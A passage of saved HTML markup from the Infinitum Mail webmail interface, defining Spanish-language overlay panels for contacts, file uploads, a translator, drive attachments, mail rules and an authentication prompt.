         style="height:32px;line-height:30px;font-size:16px; BORDER-bottom: #F3F3F3 1px solid; clear:both; visibility:hidden">
        <a id="btnContactViewPrint" class="ContactActions" href="JavaScript:fnContactsViewPrint()" style="display:">Imprimir</a>
        <a id="btnContactsGroupForward" class="ContactActions" href="JavaScript:fnContactsGroupForward()"
           style="display:none">Reenviar</a>
        <a id="btnContactGroupExport" class="ContactActions" href="JavaScript:fnContactsGroupExport()"
           style="display:none">Exportar</a>
        <a id="btnContactViewEmail" class="ContactActions"
           href="JavaScript:fnShowPOPOpt(&#39;btnContactViewEmail&#39;, &#39;mContactsViewEmailopt&#39;,0,0)"
           style="display:">Contacto de correo electr�nico como&nbsp;&nbsp;<img alt="M�s opciones" height="4"
                                                                                class="postLoadIMG"
                                                                                src="https://www.infinitummail.com/app/"
                                                                                data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/down_icon.png"
                                                                                width="8"></a>
        <a id="btnContactViewExport" class="ContactActions"
           href="JavaScript:fnShowPOPOpt(&#39;btnContactViewExport&#39;, &#39;mContactsViewExportopt&#39;,0,0)"
           style="display:">Exportar&nbsp;&nbsp;<img alt="M�s opciones" class="postLoadIMG" height="4"
                                                     src="https://www.infinitummail.com/app/"
                                                     data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/down_icon.png"
                                                     width="8"></a>
        <a id="btnContactViewDownload" class="ContactActions" href="JavaScript:fnContactsViewDownloadVcard()"
           style="display:">Descargar vCard</a>
        <span style="float:right">
    			<a id="btnContactViewEdit" class="ContactActions" href="JavaScript:fnContactsViewEdit()"
                   style="display:"><img style="padding-top:0px; height:16px; width:16px; cursor:pointer"
                                         class="jqTootltip postLoadIMG"
                                         data-url="../../app/ress/theme/Telmex/IMG/con_edit.png" title="Editar"
                                         src="https://www.infinitummail.com/app/"></a>
    			<a id="btnContactViewSave" class="ContactActions" href="JavaScript:fnContactsViewSave()"
                   style="display:none"><img style="padding-top:0px; height:16px; width:16px; cursor:pointer"
                                             class="jqTootltip postLoadIMG"
                                             data-url="../../app/ress/theme/Telmex/IMG/con_save.png" title="Guardar"
                                             src="https://www.infinitummail.com/app/"></a>
    			<a id="btnContactViewDelete" class="ContactActions" href="JavaScript:fnContactsViewDelete()"
                   style="display:"><img style="padding-top:0px; height:16px; width:16px; cursor:pointer"
                                         class="jqTootltip postLoadIMG"
                                         data-url="../../app/ress/theme/Telmex/IMG/con_delete.png" title="Borrar"
                                         src="https://www.infinitummail.com/app/"></a>
    			<a id="btnContactViewClose" class="ContactActions" href="JavaScript:fnContactsExitFullscreen()"
                   style="display:"><img style="padding-top:0px; height:16px; width:16px; cursor:pointer"
                                         class="jqTootltip postLoadIMG" src="./index_files/close_20_white.png"
                                         title="Cerrar"></a>&nbsp;
    		</span>
    </div>
    <iframe id="ifm_ContactsView"
            style="background-color:#fff;padding-top:15px; BORDER: #ffffff 0px solid; overflow:auto" scrolling="auto"
            frameborder="0" border="0" name="ifm_ContactsView" src="./index_files/saved_resource(2).html" width="100%"
            height="100%" allowtransparency="" borderwidth="0" __idm_frm__="2960"></iframe>
</div>
<!-- ::::: Contacts View Page ENDS ::::: -->


<!-- ::::: Feedback form View Page STARTS  ::::: -->
<div id="divFeedbackFormView" class="MsgpreFullscreen"
     style="position:absolute;z-index:1003;display:none; background-color:#fff; padding-top:0px ;">
    <div style="height:32px;line-height:30px;font-size:16px; BORDER-bottom: #F3F3F3 1px solid; clear:both; background-color:#F4F4F4; text-align:center">
        Retroalimentaci�n
        <span style="float:right">
    			<a class="ContactActions" href="JavaScript:fnFeedbackFormExitFullscreen()" style="display:"><img
                        style="padding-top:0px; height:16px; width:16px; cursor:pointer" class="jqTootltip postLoadIMG"
                        src="./index_files/close_20_white.png" title="Cerrar"></a>&nbsp;
    		</span>
    </div>
    <iframe id="ifm_FeedbackFormView"
            style="background-color:#fff;padding-top:15px; BORDER: #ffffff 0px solid; overflow:auto" scrolling="auto"
            frameborder="0" border="0" name="ifm_FeedbackFormView" src="./index_files/saved_resource(3).html"
            width="100%" height="100%" allowtransparency="" borderwidth="0" __idm_frm__="2961"></iframe>
</div>
<!-- ::::: Feedback form View Page ENDS ::::: -->

<!-- ::::: Documents Viewer Page STARTS  ::::: -->
<div id="divOnlineDocsView" class="MsgpreFullscreen"
     style="position:absolute;z-index:101;display:none; background-color:#CACACA; padding-top:0px; -webkit-box-shadow: 5px 5px 15px 5px rgba(120,129,126,137);-moz-box-shadow: 5px 5px 15px 5px rgba(120,129,126,137);box-shadow: 5px 5px 15px 5px rgba(120,129,126,137)">
    <div style="height:32px;line-height:30px;font-size:16px; BORDER-bottom: #F3F3F3 1px solid; clear:both; background-color:#F4F4F4; text-align:center">
        <span id="spanOnlineDocsViewTitle"></span>
        <span style="float:right">
    			<a class="" href="JavaScript:fnOnlineDocsExitFullscreen()" style="display:"><img
                        style="padding-top:0px; height:16px; width:16px; cursor:pointer" class="jqTootltip postLoadIMG"
                        src="./index_files/close_big_gray.png" title="Cerrar">&nbsp;</a>&nbsp;
    		</span>
    </div>
    <iframe id="ifm_OnlineDocsView" style="background-color:#fff;BORDER: #ffffff 0px solid; overflow:auto"
            scrolling="auto" frameborder="0" border="0" name="ifm_OnlineDocsView"
            src="./index_files/saved_resource(4).html" width="100%" height="100%" allowtransparency="" borderwidth="0"
            __idm_frm__="2962"></iframe>
</div>
<!-- ::::: Documents Viewer Page ENDS ::::: -->

<!-- ::::: MediaVideo Viewer Page STARTS  ::::: -->
<div id="divMediaVideoView" style="position:absolute;z-index:101;display:none; background-color:#000; padding-top:0px">
    <div style="height:32px;line-height:30px;font-size:16px; BORDER-bottom: #3E454E 1px solid; clear:both; background-color:#626262; text-align:center; color:#fff">
        <span id="spanMediaVideoViewTitle"></span>
        <span style="float:right">
    			<a href="JavaScript:fnMediaVideoExitFullscreen()"
                   style="display:inline-block; height:100%; padding-right:10px; padding-left:8px; cursor:pointer; color:#454545; text-decoration:none"><img
                        style="padding-top:0px; height:16px; width:16px; cursor:pointer" class="jqTootltip postLoadIMG"
                        src="./index_files/close_20_white.png" title="Cerrar"></a>&nbsp;
    		</span>
    </div>
    <iframe id="ifm_MediaVideoView" style="background-color:#000;BORDER: #ffffff 0px solid; overflow:auto"
            scrolling="auto" frameborder="0" border="0" name="ifm_OnlineDocsView"
            src="./index_files/saved_resource(5).html" width="100%" height="100%" allowtransparency="" borderwidth="0"
            __idm_frm__="2963"></iframe>
</div>
<!-- ::::: Documents Viewer Page ENDS ::::: -->


<!-- ::::: POP3 View Page STARTS  ::::: -->
<div id="divPOP3View" class="MsgpreFullscreen"
     style="position:absolute;z-index:101;display:none; background-color:#fff; padding-top:0px ;">
    <div id="mPOP3MainPanelHead"
         style="height:32px;line-height:30px;font-size:16px; BORDER-bottom: #F3F3F3 1px solid; clear:both; visibility:hidden">
    		<span style="float:right">
    			<a id="btnPOP3ViewSave" class="ContactActions" href="JavaScript:fnPOP3ViewSave()" style="display:"><img
                        style="padding-top:0px; height:16px; width:16px; cursor:pointer" class="jqTootltip postLoadIMG"
                        data-url="https://www.infinitummail.com/app/ress/theme/Telmex/IMG/con_save.png" title="Guardar"
                        src="https://www.infinitummail.com/app/"></a>
    			<a id="btnPOP3ViewDelete" class="ContactActions" href="JavaScript:fnPOP3ViewDelete()"
                   style="display:none"><img style="padding-top:0px; height:16px; width:16px; cursor:pointer"
                                             class="jqTootltip postLoadIMG"
                                             data-url="https://www.infinitummail.com/app/ress/theme/Telmex/IMG/con_delete.png"
                                             title="Borrar" src="https://www.infinitummail.com/app/"></a>
    			<a id="btnPOP3ViewClose" class="ContactActions" href="JavaScript:fnPOP3ExitFullscreen()"
                   style="display:"><img style="padding-top:0px; height:16px; width:16px; cursor:pointer"
                                         class="jqTootltip postLoadIMG"
                                         data-url="https://www.infinitummail.com/app/ress/theme/V12/IMG/close_20_white.png"
                                         title="Cerrar" src="https://www.infinitummail.com/app/"></a>&nbsp;
    		</span>
    </div>
    <iframe id="ifm_POP3View" style="background-color:#fff;padding-top:15px; BORDER: #ffffff 0px solid; overflow:auto"
            scrolling="auto" frameborder="0" border="0" name="ifm_POP3View" src="./index_files/saved_resource(6).html"
            width="100%" height="100%" allowtransparency="" borderwidth="0" __idm_frm__="2964"></iframe>
</div>
<!-- ::::: POP3 View Page ENDS ::::: -->

<!-- ::::: POP3 Status POP STARTS  ::::: -->
<div id="divPOP3StatusView" class="MsgpreFullscreen"
     style="position:absolute;z-index:101;display:none; background-color:#fff; padding-top:0px ;">
    <div id="mPOP3StatusMainPanelHead"
         style="height:32px;line-height:30px;font-size:16px; BORDER-bottom: #F3F3F3 1px solid; clear:both; visibility:hidden">
        <span id="divPOPStatusConn" style="font-size:11px"></span>
        <span style="float:right">
    			<a id="btnPOP3StatusViewClose" class="ContactActions" href="JavaScript:fnPOP3StatusExitFullscreen()"
                   style="display:"><img style="padding-top:0px; height:16px; width:16px; cursor:pointer"
                                         class="jqTootltip postLoadIMG"
                                         data-url="../../app/ress/theme/V12/IMG/close_20_white.png" title="Cerrar"
                                         src="https://www.infinitummail.com/app/"></a>&nbsp;
    		</span>
    </div>
    <div id="divPOPStatusInfo" style="text-align:center; padding-top:10px"></div>
</div>
<!-- ::::: POP3 Status POP ENDS ::::: -->


<!-- ::::: BackPack : Photos Slideshow View Page STARTS  ::::: -->
<div id="divBPPhotoSlideView" class="MsgpreFullscreen"
     style="position:absolute;z-index:101;display:none; background-color:#fff; padding-top:0px ;">
    <iframe id="ifm_BPPhotoSlideView" style="background-color:#000000;BORDER: #ffffff 0px solid; overflow:hidden"
            scrolling="no" frameborder="0" border="0" name="ifm_BPPhotoSlideView"
            src="./index_files/saved_resource(7).html" width="100%" height="100%" allowtransparency="" borderwidth="0"
            __idm_frm__="2965"></iframe>
</div>
<!-- ::::: BackPack : Photos Slideshow View Page ENDS ::::: -->


<!-- ::::: T H E    M A G I C B O X | STARTS ::::: -->
<div id="divMagicBoxMenu" class="MsgpreFullscreen"
     style="width:540px; border:0px #F2F2F2 solid;  position:absolute; z-index:1002; display:none; background-color:#fff; padding:0px; ">
    <!-- MBox Header -->
    <div style="color:#fff; height:35px; line-height:35px; padding-right:15px; padding-left:15px; -webkit-border-top-left-radius: 5px; -webkit-border-top-right-radius: 5px; -moz-border-radius-topleft: 5px; -moz-border-radius-topright: 5px; border-top-left-radius: 5px; border-top-right-radius: 5px;"
         id="MBOX_Header_Title">
        <div style="display:inline-block; float:left; font-weight:normal;  height:35px; line-height:35px;">
            <div id="MBoxTitle" style="display:inline-block"></div>
            <div id="MBoxTotalProgressBarBG"
                 style="margin-left:10px ; position:relative; top:3px ;height:17px; width:158px; color:#fff; text-align:center; display:inline-block">
                <div id="MBoxTotalProgressBar" class="ProgressBarBGC" style="width:0%; height:16px"></div>
            </div>
        </div>
        <div style="display:inline-block; float:right; height:35px; line-height:35px;">
            &nbsp;&nbsp;&nbsp;<img style="padding-top:0px; height:16px; width:16px; cursor:pointer"
                                   class="jqTootltip postLoadIMG"
                                   title="Cerrar el cargador. Los archivos cargados permanecer�n en su unidad"
                                   onclick="fnMagicBoxClose()"
                                   data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/close_20_white.png"
                                   src="https://www.infinitummail.com/app/" id="MBOX_min">
        </div>
    </div>
    <!-- MBox Actions -->
    <div style="float: left; width: 100%; -moz-user-select: none; height: 30px; background-color:#F1F2F6; color: #708194; line-height: 30px; font-size: 16px; border-bottom: 1px solid rgb(243, 243, 243);"
         id="divMBoxList">
        <a href="JavaScript:fnMBoxShowCheckOpt()" id="ckMPOX" class="jqTootltip" title="seleccionar/descartar todo"
           style="padding-right:0px; padding-left:10px">&nbsp;<input type="checkbox" onclick="MPOXCAll(this)"
                                                                     id="MBOXCall" name="Call">&nbsp;&nbsp;<img
                width="8" height="4" src="./index_files/down_icon.png" id="mMainCheckOptImg" class="jqTootltip"
                title="M�s opciones">&nbsp;&nbsp;</a>&nbsp;
        <a id="btnMBOXDelte" href="JavaScript:fnMBoxDelete()" title="Mover a la papelera" style="display:none"
           class="MBoxBtnAction">Borrar</a>
        <a id="btnMBOXEmail" href="JavaScript:fnMBoxEmail()" title="archivos de correo electr�nico" style="display:none"
           class="MBoxBtnAction">Correo electr�nico</a>
        <a id="btnMBOXShare" href="JavaScript:" style="display:none" class="MBoxBtnAction">Compartir</a>
        <a href="JavaScript:fnShowPOPOpt(&#39;btnMBOXMove&#39;, &#39;mBackPackDirsList&#39;,0,0)" id="btnMBOXMove"
           title="Mover a carpeta" style="display:none" class="MBoxBtnAction">Mover&nbsp;&nbsp;<img width="8" height="4"
                                                                                                    src="./index_files/down_icon.png"
                                                                                                    id="mMainCheckOptImg"
                                                                                                    alt="M�s opciones"></a>&nbsp;&nbsp;
        <div style="color:#454545; display:inline-block; float: right; font-size: 12px;" id="divMBOXOpt">
            <a href="JavaScript:fnShowPOPOpt(&#39;btnArrangeMPOX&#39;, &#39;mMBoxSortOptions&#39;,0,0)"
               id="btnArrangeMPOX" style="visibility:hidden" class="MBoxBtnAction">Por nombre&nbsp;&nbsp;<img width="8"
                                                                                                              height="4"
                                                                                                              src="./index_files/down_icon.png"
                                                                                                              id="mMainCheckOptImg"
                                                                                                              alt="M�s opciones">&nbsp;</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
        </div>
    </div>
    <!-- MBox List -->
    <div id="divMagicBoxList"
         style=" margin-top:40px; margin-bottom:10px; min-height:200px !important; overflow-y: auto; overflow-x: hidden; max-height:350px !important;"></div>
    <div id="divMagicBoxBtns"
         style=" border-top: 1px #f1f2f6 solid;color:#fff; background-color:#F1F2F6; height:50px; line-height:50px; padding-right:20px; padding-left:15px; -webkit-border-bottom-right-radius: 5px; -webkit-border-bottom-left-radius: 5px; -moz-border-radius-bottomright: 5px; -moz-border-radius-bottomleft: 5px; border-bottom-right-radius: 5px; border-bottom-left-radius: 5px;">
        <div style="display:inline-block; float:left; font-weight:normal; padding-left:0px; color:#708194;  height:50px; line-height:50px;">
            <span class="jqTootltip" title="Distribuir archivos autom�ticamente en carpetas, basados en el tipo"><input
                    type="checkbox" saction="done" onclick="MPOXCheckAI(this)" id="MBOXAI" name="Call">&nbsp;Organizar archivos</span>
        </div>
        <div style="display:inline-block; float:right;  height:50px; line-height:50px;">
            <a id="MBoxDoneBtn" href="JavaScript:fnMBoxDoneBtn()"
               class="yui3-button">Listo</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="JavaScript:fnMBoxGoToMyfilesBtn()"
                                                                       id="MBoxGoToMyfilesBtn" class="buttonSnd">Ir a la
            unidad</a>
        </div>
    </div>

</div>
<!-- ::::: T H E    M A G I C B O X | ENDS  ::::: -->


<!-- ::::: TEXT TRANSLATOR STARTS  ::::: -->
<div id="divTranslatorMenu" class="MsgpreFullscreen"
     style="width:640px; border:0px #F2F2F2 solid;  position:absolute; z-index:1002; display:none; background-color:#fff; padding:0px; ">
    <!-- MBox Header -->
    <div style="color:#fff; height:35px; line-height:35px; padding-right:15px; padding-left:15px; -webkit-border-top-left-radius: 5px; -webkit-border-top-right-radius: 5px; -moz-border-radius-topleft: 5px; -moz-border-radius-topright: 5px; border-top-left-radius: 5px; border-top-right-radius: 5px;"
         id="TransBOX_Header_Title">
        <div style="display:inline-block; float:left; font-weight:normal; height:35px; line-height:35px;">Traductor
        </div>
        <div style="display:inline-block; float:right; height:35px; line-height:35px;">
            &nbsp;&nbsp;&nbsp;<img style="padding-top:0px; height:16px; width:16px; cursor:pointer" class="jqTootltip"
                                   title="Cerrar traductor" onclick="fnTranslatorBoxClose()"
                                   src="./index_files/close_20_white(1).png" id="MBOX_min">
        </div>
    </div>
    <!-- Actions -->
    <div style="float: left; width: 100%; -moz-user-select: none; height: 30px; background-color:#F1F2F6; color: #708194; line-height: 30px; font-size: 16px; border-bottom: 1px solid rgb(243, 243, 243);"
         id="divMBoxList">
        <a href="JavaScript:fnShowPOPOpt(&#39;btnTranslatorLangMenu&#39;, &#39;mTranslatorMenu&#39;,0,0)"
           id="btnTranslatorLangMenu" style="visibility:visible" class="MBoxBtnAction"><span id="TranslatorLangMenuTxt">Ingl�s a Franc�s</span>&nbsp;&nbsp;<img
                width="8" height="4" src="./index_files/down_icon.png" id="mMainCheckOptImg"
                alt="M�s opciones">&nbsp;</a>
        <a href="JavaScript:fnShowPOPOpt(&#39;btnTranslatorLangOptMenu&#39;, &#39;mTranslatorOptMenu&#39;,0,0)"
           id="btnTranslatorLangOptMenu" style="visibility:visible; display:none" class="MBoxBtnAction">Opciones&nbsp;&nbsp;<img
                width="8" height="4" src="./index_files/down_icon.png" id="mMainCheckOptImg"
                alt="M�s opciones">&nbsp;</a>
    </div>
    <!-- List -->
    <div id="divTranslatorBoxList"
         style=" margin-top:40px; margin-bottom:10px; margin-left:10px ; min-height:200px !important; overflow-y: auto; overflow-x: hidden;">
        <textarea rows="6" cols="70" id="translation_input" onfocus="fnmTranslateFocus()"
                  style="width: 609px; height: 86px;">Ingrese aqu� el texto</textarea>
        <div style="height:10px"></div>
        <div style="width: 615px; height: 86px; background-color:#F0F0F0; overflow:auto !important"
             id="translation_output"></div>
    </div>
    <div id="divTranslatorBoxBtns"
         style=" border-top: 0px #f1f2f6 solid;color:#fff; padding-right:20px; padding-left:15px; -webkit-border-bottom-right-radius: 5px; -webkit-border-bottom-left-radius: 5px; -moz-border-radius-bottomright: 5px; -moz-border-radius-bottomleft: 5px; border-bottom-right-radius: 5px; border-bottom-left-radius: 5px;">
        <div style="height:50px; line-height:50px; text-align:right; margin-top:20px ">
            <a id="MBoxTranslateBtn" href="JavaScript:fnTranslateBtn()" class="buttonSnd">Traducir</a><span
                id="rteInsertTransTxt" style="display:none">&nbsp;&nbsp;&nbsp;&nbsp;<a id="MBoxTranslateBtn"
                                                                                       href="JavaScript:fnRTETranslateBtn()"
                                                                                       class="buttonSnd">Utilizar</a></span>
        </div>
    </div>
</div>
<!-- ::::: TEXT TRANSLATOR ENDS ::::: -->


<!-- ::::: T H E   D R I V E B O X STARTS  ::::: -->
<div id="divDriveBoxMenu" class="MsgpreFullscreen"
     style="width:650px; border:0px #F2F2F2 solid;  position:absolute; z-index:1002; display:none; background-color:#fff; padding:0px; ">
    <!-- MBox Header -->
    <div style="color:#fff; height:35px; line-height:35px; padding-right:15px; padding-left:15px; -webkit-border-top-left-radius: 5px; -webkit-border-top-right-radius: 5px; -moz-border-radius-topleft: 5px; -moz-border-radius-topright: 5px; border-top-left-radius: 5px; border-top-right-radius: 5px;"
         id="DriveBOX_Header_Title">
        <div style="display:inline-block; float:left; font-weight:normal; height:35px; line-height:35px;">
            <div id="DriveBoxTitle" style="display:inline-block">Adjuntar archivos desde Infinitum Drive</div>
        </div>
        <div style="display:inline-block; float:right; height:35px; line-height:35px;">
            &nbsp;&nbsp;&nbsp;<img style="padding-top:0px; height:16px; width:16px; cursor:pointer" class="jqTootltip"
                                   title="Cerrar" onclick="fnDriveBoxClose()" src="./index_files/close_20_white(1).png"
                                   id="DriveBox_min">
        </div>
    </div>
    <!-- Actions -->
    <div style="float: left; width: 100%; -moz-user-select: none; height: 30px; background-color:#F1F2F6; color: #708194; line-height: 30px; font-size: 16px; border-bottom: 1px solid rgb(243, 243, 243);"
         id="divMBoxList">
        <a href="JavaScript:fnShowPOPOpt(&#39;ckDriveBox&#39;, &#39;mBackpackCheckBoxOptions&#39;,0,0)" id="ckDriveBox"
           class="MBoxBtnAction jqTootltip" title="seleccionar/descartar todo"
           style="padding-right:0px; padding-left:10px">&nbsp;<input type="checkbox" onclick="fnBackpackCAll(this)"
                                                                     id="CallBackpack"
                                                                     name="CallBackpack">&nbsp;&nbsp;<img width="8"
                                                                                                          height="4"
                                                                                                          src="./index_files/down_icon.png"
                                                                                                          class="jqTootltip"
                                                                                                          title="M�s opciones">&nbsp;&nbsp;</a>&nbsp;
        <a id="btnDriveBoxBack" href="JavaScript:fnDriveBoxBack()" style="display:inline-block" class="MBoxBtnAction">Volver</a>
    </div>
    <!-- List -->
    <div id="divDriveBoxList"
         style="height:350px !important; margin-top:40px; margin-bottom:10px; min-height:200px !important; overflow-y:scroll ; overflow-x: hidden; max-height:350px !important;"></div>
    <div id="divDriveBoxBtns"
         style=" border-top: 1px #f1f2f6 solid;color:#fff; background-color:#F1F2F6; height:50px; line-height:50px; padding-right:20px; padding-left:15px; -webkit-border-bottom-right-radius: 5px; -webkit-border-bottom-left-radius: 5px; -moz-border-radius-bottomright: 5px; -moz-border-radius-bottomleft: 5px; border-bottom-right-radius: 5px; border-bottom-left-radius: 5px;">
        <div style="display:inline-block; float:left; font-weight:normal; padding-left:0px; color:#708194;  height:50px; line-height:50px;">
            <span style="visibility:hidden"></span></div>
        <div style="display:inline-block; float:right;  height:50px; line-height:50px;">
            <a id="DriveBoxeInsertBtn" href="JavaScript:fnDriveBoxAttachBtn(0)" class="yui3-button">Insertar como
                v�nculos</a>&nbsp;&nbsp;&nbsp;&nbsp;<a id="DriveBoxeAttachBtn" href="JavaScript:fnDriveBoxAttachBtn(1)"
                                                       class="yui3-button">Agregar como adjuntos</a>&nbsp;&nbsp;&nbsp;&nbsp;<a
                href="JavaScript:fnDriveBoxClose()" id="DriveBoxGoToMyfilesBtn" class="yui3-button">Cerrar</a>
        </div>
    </div>

</div>
<!-- ::::: T H E   D R I V E B O X  ENDS  ::::: -->


<!-- ::::: MsgRule STARTS  ::::: -->
<div id="divMsgRuleMenu" class="MsgpreFullscreen"
     style="width:640px; border:0px #F2F2F2 solid;  position:absolute; z-index:1002; display:none; background-color:#fff; padding:0px; ">
    <!-- SetRule Header -->
    <div style="color:#fff; height:35px; line-height:35px; padding-right:15px; padding-left:15px; -webkit-border-top-left-radius: 5px; -webkit-border-top-right-radius: 5px; -moz-border-radius-topleft: 5px; -moz-border-radius-topright: 5px; border-top-left-radius: 5px; border-top-right-radius: 5px;"
         id="RulesBOX_Header_Title">
        <div style="display:inline-block; float:left; font-weight:normal; height:35px; line-height:35px;">
            Crear reglas de correo electr�nico
        </div>
        <div style="display:inline-block; float:right; height:35px; line-height:35px;">
            &nbsp;&nbsp;&nbsp;<img style="padding-top:0px; height:16px; width:16px; cursor:pointer" class="jqTootltip"
                                   title="Cerrar" onclick="fnMsgRuleBoxClose()"
                                   src="./index_files/close_20_white(1).png" id="MBOX_min">
        </div>
    </div>
    <!-- SetRule List -->
    <div id="divMsgRuleBoxList"
         style=" margin-top:5px; margin-bottom:10px; margin-left:10px ; min-height:200px !important; overflow-y: auto; overflow-x: hidden;"></div>
    <div id="divMsgRuleBoxBtns"
         style=" border-top: 1px #f1f2f6 solid;color:#fff; background-color:#F1F2F6; padding-right:20px; padding-left:15px; -webkit-border-bottom-right-radius: 5px; -webkit-border-bottom-left-radius: 5px; -moz-border-radius-bottomright: 5px; -moz-border-radius-bottomleft: 5px; border-bottom-right-radius: 5px; border-bottom-left-radius: 5px;">

        <div style="height:50px; line-height:50px; text-align:right; ">
            <a id="MBoxMsgRuleOKBtn" href="JavaScript:fnMsgRuleOKBtn()" class="yui3-button">Confirmar</a>&nbsp;&nbsp;&nbsp;<a
                href="JavaScript:fnMsgRuleBoxClose()" class="yui3-button">Cancelar</a>
        </div>
    </div>

</div>
<!-- ::::: MsgRule ENDS ::::: -->


<!-- ::::: SaveRecipients STARTS  ::::: -->
<div id="divSaveRecipientsMenu" class="MsgpreFullscreen"
     style="width:580px; border:0px #F2F2F2 solid;  position:absolute; z-index:1002; display:none; background-color:#fff; padding:0px; ">
    <!-- SetRule Header -->
    <div style="color:#fff; height:35px; line-height:35px; padding-right:15px; padding-left:15px; -webkit-border-top-left-radius: 5px; -webkit-border-top-right-radius: 5px; -moz-border-radius-topleft: 5px; -moz-border-radius-topright: 5px; border-top-left-radius: 5px; border-top-right-radius: 5px;"
         id="RulesBOX_Header_Title">
        <div style="display:inline-block; float:left; font-weight:normal; height:35px; line-height:35px;">
            A�adir nuevos destinatarios a su lista de contactos
        </div>
        <div style="display:inline-block; float:right; height:35px; line-height:35px;">
            &nbsp;&nbsp;&nbsp;<img style="padding-top:0px; height:16px; width:16px; cursor:pointer" class="jqTootltip"
                                   title="Cerrar" onclick="fnSaveRecipientsBoxClose()"
                                   src="./index_files/close_20_white(1).png" id="MBOX_min">
        </div>
    </div>
    <!-- SetRule List -->
    <div id="divSaveRecipientsBoxList"
         style=" margin-top:0px; margin-bottom:0px; margin-left:0px ; min-height:200px !important; overflow-y: auto; overflow-x: hidden; max-height:200px !important; height:200px"></div>
    <div id="divSaveRecipientsBoxBtns"
         style=" border-top: 1px #f1f2f6 solid;color:#fff; background-color:#F1F2F6; padding-right:20px; padding-left:15px; -webkit-border-bottom-right-radius: 5px; -webkit-border-bottom-left-radius: 5px; -moz-border-radius-bottomright: 5px; -moz-border-radius-bottomleft: 5px; border-bottom-right-radius: 5px; border-bottom-left-radius: 5px;">

        <div style="height:50px; line-height:50px; text-align:right; ">
            <a id="MBoxSaveRecipientsOKBtn" href="JavaScript:fnSaveRecipientsOKBtn()" class="yui3-button">Agregar</a>&nbsp;&nbsp;&nbsp;<a
                href="JavaScript:fnSaveRecipientsBoxClose()" class="yui3-button">Cancelar</a>
        </div>
    </div>

</div>
<!-- ::::: SaveRecipients ENDS ::::: -->


<!-- ::::: Auth Box STARTS  ::::: -->
<div id="divAuthBOX" class="MsgpreFullscreen"
     style="width:380px; border:0px #F2F2F2 solid;  position:absolute; z-index:1002; display:none; background-color:#fff; padding:0px; ">
    <!-- Header -->
    <div style="color:#fff; height:35px; line-height:35px; padding-right:15px; padding-left:15px; -webkit-border-top-left-radius: 5px; -webkit-border-top-right-radius: 5px; -moz-border-radius-topleft: 5px; -moz-border-radius-topright: 5px; border-top-left-radius: 5px; border-top-right-radius: 5px;"
         id="RulesBOX_Header_Title">
        <div style="display:inline-block; float:left; font-weight:normal; height:35px; line-height:35px;">
            Autentificaci�n requerida
        </div>
        <div style="display:inline-block; float:right; height:35px; line-height:35px;">
            &nbsp;&nbsp;&nbsp;<img style="padding-top:0px; height:16px; width:16px; cursor:pointer" class="jqTootltip"
                                   title="Cerrar" onclick="fnAuthBOXClose()" src="./index_files/close_20_white(1).png"
                                   id="MBOX_min">
        </div>
    </div>
    <!-- List -->
    <div id="divAuthBoxList"
         style=" padding: 5px; margin:15px; margin-bottom:0px; min-height:150px !important; overflow-y: auto; overflow-x: hidden; max-height:150px !important; height:200px"></div>
    <div id="divAuthBoxBtns"
         style=" border-top: 1px #f1f2f6 solid;color:#fff; background-color:#F1F2F6; padding-right:20px; padding-left:15px; -webkit-border-bottom-right-radius: 5px; -webkit-border-bottom-left-radius: 5px; -moz-border-radius-bottomright: 5px; -moz-border-radius-bottomleft: 5px; border-bottom-right-radius: 5px; border-bottom-left-radius: 5px;">

        <div style="height:50px; line-height:50px; text-align:right; ">
            <a id="MBoxAuthOKBtn" href="JavaScript:fnAuthPassCall()" class="yui3-button">Confirmar</a>&nbsp;&nbsp;&nbsp;<a
                href="JavaScript:fnAuthBOXClose()" class="yui3-button">Cerrar</a>
        </div>
    </div>

</div>
<!-- ::::: Auth Box ENDS ::::: -->

<style>

    .cssCard {
        position: absolute;
        border: 1px #CCCCCC solid;
        background-color: #fff;
        font-family: arial, helvetica, sans-serif;
        font-size: 11px;
        z-index: 100;
        visibility: hidden;
        text-decoration: none;
        color: #545454;

        -moz-box-shadow: 2px 2px 2px #CACACA;
        -webkit-box-shadow: 2px 2px 2px #CACACA;
        box-shadow: 2px 2px 2px #CACACA;

        border-radius: 8px;

    }

    .cssCard:after {
        z-index: -1;
        position: absolute;
        top: 100%;
        left: 10%;
        margin-left: -10px;
        content: '';
        width: 0;
        height: 0;
        border-top: solid 10px #CACACA;
        border-left: solid 10px transparent;
        border-right: solid 10px transparent;
    }


</style>

<!-- ::::: MSG CARD Box STARTS  ::::: -->
<div id="mCardPOPO" class="cssCard"
     style="position: absolute; left: 270px; top: 438px; padding: 7px; z-index: 1003; visibility:hidden; width:600px; height:160px"
     onmouseover="fnKeepMSGCard(true)">
    <iframe id="ifm_MSGCard" frameborder="0" border="0" name="ifm_MSGCard" src="./index_files/saved_resource(8).html"
            width="100%" height="100%" style=";BORDER: #ffffff 0px solid; overflow: hidden;" scrolling="no"
            seamless="seamless" allowtransparency="" borderwidth="0" __idm_frm__="2966"></iframe>
</div>
<!-- ::::: MSG CARD Box ENDS   ::::: -->


<!-- ::::: full screen divs STARTS  ::::: -->
<div id="raptor-wrapper-fullscreen" onclick="fnExitRTEFullScreen()"
     style="z-index:98;width:100%;  height:100% ;position:absolute; top:0px; left:0px; background-color:#e3e4e8; display:none; opacity:.4"></div>
<div id="msgprev-fullscreen" onclick="fnMsgExitFullscreen()"
     style="z-index:100;width:100%;  height:100% ;position:absolute; top:0px; left:0px; background-color:#e3e4e8; display:none; opacity:.4"></div>
<div id="settings-fullscreen" onclick="fnSettingsExitFullscreen()"
     style="z-index:100;width:100%;  height:100% ;position:absolute; top:0px; left:0px; background-color:#e3e4e8; display:none; opacity:.4"></div>
<div id="contacts-fullscreen" onclickx="fnContactsExitFullscreen()"
     style="z-index:100;width:100%;  height:100% ;position:absolute; top:0px; left:0px; background-color:#e3e4e8; display:none; opacity:.4"></div>
<div id="feedbackForm-fullscreen"
     style="z-index:1002;width:100%;  height:100% ;position:absolute; top:0px; left:0px; background-color:#e3e4e8; display:none; opacity:.4"></div>
<div id="POP3-fullscreen" onclickx="fnPOP3ExitFullscreen()"
